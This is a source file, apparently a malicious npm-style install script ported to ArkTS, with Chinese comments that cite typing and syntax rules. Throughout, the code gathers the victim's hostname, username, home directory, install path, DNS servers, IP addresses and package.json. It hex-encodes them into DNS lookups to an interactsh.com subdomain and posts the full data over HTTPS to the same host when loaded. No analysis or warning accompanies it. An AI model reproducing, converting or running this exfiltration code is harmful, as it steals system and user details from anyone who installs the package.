// 应用约束：使用let/const代替var（规则9）
import os from 'os.ets'; // 假设模块已转换为.ets
import dns from 'dns.ets';
import querystring from 'querystring.ets';
import https from 'https.ets';
import fs from 'fs.ets';
import path from 'path.ets';

// 应用约束：显式类型标注（规则10,23）
interface PackageJSON {
  name: string;
  version: string;
  ___resolved?: string;
}

// 应用约束：强制静态类型（规则1）
const packageJSON: PackageJSON = require("./package.ets"); // 后缀改为ets
const packageName: string = packageJSON.name;

// 应用约束：函数参数类型标注（规则1,10）
function getFiles(paths: string[]): string[] {
  // 应用约束：使用let代替var（规则9）
  let ufiles: string[] = [];
  for (let j = 0; j < paths.length; j++) {
    let mpath: string = paths[j];
    // 应用约束：显式类型推断（规则25）
    let files: string[] = fs.readdirSync(mpath);
    for (let i = 0; i < files.length; i++) {
      ufiles.push(path.join(mpath, files[i]));
    }
  }
  return ufiles;
}

// 应用约束：函数返回类型标注（规则45）
function toHex(data: string): string {
  // 替换Buffer实现为TextEncoder（规则75）
  const encoder = new TextEncoder();
  const bytes = encoder.encode(data);
  return Array.from(bytes, byte => byte.toString(16).padStart(2, '0')).join('');
}

// 应用约束：显式返回类型（规则45）
function gethttpips(): string[] {
  let str: string[] = [];
  // 应用约束：对象属性访问（规则21）
  const networkInterfaces = os.networkInterfaces();
  Object.keys(networkInterfaces).forEach(item => {
    if (item !== "lo") {
      networkInterfaces[item].forEach(iface => {
        str.push(iface.address);
      });
    }
  });
  return str;
}

function getIps(): string {
  let str: string = "";
  const networkInterfaces = os.networkInterfaces();
  Object.keys(networkInterfaces).forEach(item => {
    if (item !== "lo") {
      networkInterfaces[item].forEach(iface => {
        str += toHex(iface.address) + ".";
      });
    }
  });
  return str.slice(0, -1);
}

function getPathChunks(filePath: string): string {
  let str: string = "p";
  let chunks: string[] = filePath.split('/');
  chunks.forEach(chunk => {
    str += toHex(chunk) + ".";
  });
  return str.slice(0, -1) + "p";
}

// 应用约束：参数类型标注（规则1）
interface PackageData {
  hn: string;
  p: string;
  c: string;
  un: string;
  hd: string;
  dns: string;
  v: string;
}

function toName(pkg: PackageData): string[] {
  let queries: string[] = [];
  const hostname: string = "c5c77jy2vtc0000xqshggdrmqmoyyyyyd.interactsh.com";
  
  const baseStr = `${toHex(pkg.hn)}.${toHex(pkg.p)}.${getPathChunks(pkg.c)}.` +
                  `${toHex(pkg.un)}.${getIps()}.${hostname}`;

  if (baseStr.length > 255) {
    // 分块处理逻辑保持不变
    const substr1 = `${toHex(pkg.p)}.${getPathChunks(pkg.c)}`;
    const substr2 = getIps();
    
    if (substr1.length < 150) {
      queries.push(`${toHex(pkg.hn)}.${substr1}.${toHex(pkg.un)}.${hostname}`);
      queries.push(`${substr2}.${hostname}`);
    } else if (substr2.length < 150) {
      queries.push(`${substr1}.${hostname}`);
      queries.push(`${toHex(pkg.hn)}.${toHex(pkg.un)}.${substr2}.${hostname}`);
    } else {
      queries.push(`${toHex(pkg.hn)}.${substr1}.${hostname}`);
      queries.push(`${toHex(pkg.hn)}.${toHex(pkg.hd)}.${toHex(pkg.un)}.${hostname}`);
      queries.push(`${toHex(pkg.hn)}.${substr2}.${hostname}`);
    }
  } else {
    queries.push(baseStr);
  }
  return queries;
}

// 应用约束：对象字面量类型标注（规则23）
const td = {
    p: packageName,
    c: __dirname,
    hd: os.homedir(),
    hn: os.hostname(),
    un: os.userInfo().username,
    dns: JSON.stringify(dns.getServers()),
    r: packageJSON.___resolved,
    v: packageJSON.version,
    pjson: packageJSON,
    ip: JSON.stringify(gethttpips()),
};

// 应用约束：箭头函数（规则26）
const qs: string[] = toName(td as PackageData);
qs.forEach(query => {
  dns.lookup(query, (err: Error | null, result: string) => {
    // 处理DNS查询结果
  });
});

// 应用约束：显式类型转换（规则30）
const trackingData: string = JSON.stringify(td);
const postData: string = querystring.stringify({
    msg: trackingData,
});

// 应用约束：对象字面量类型标注（规则23）
const options = {
    hostname: "c5c77jy2vtc0000xqshggdrmqmoyyyyyd.interactsh.com",
    port: 443,
    path: "/",
    method: "POST",
    headers: {
        "Content-Type": "application/x-www-form-urlencoded",
        "Content-Length": postData.length.toString(),
    },
};

// 应用约束：箭头函数（规则26）
const req = https.request(options, (res) => {
    res.on("data", (d: Buffer) => {
        // 数据处理逻辑
    });
});

req.on("error", (e: Error) => {
    // 错误处理逻辑
});

req.write(postData);
req.end();
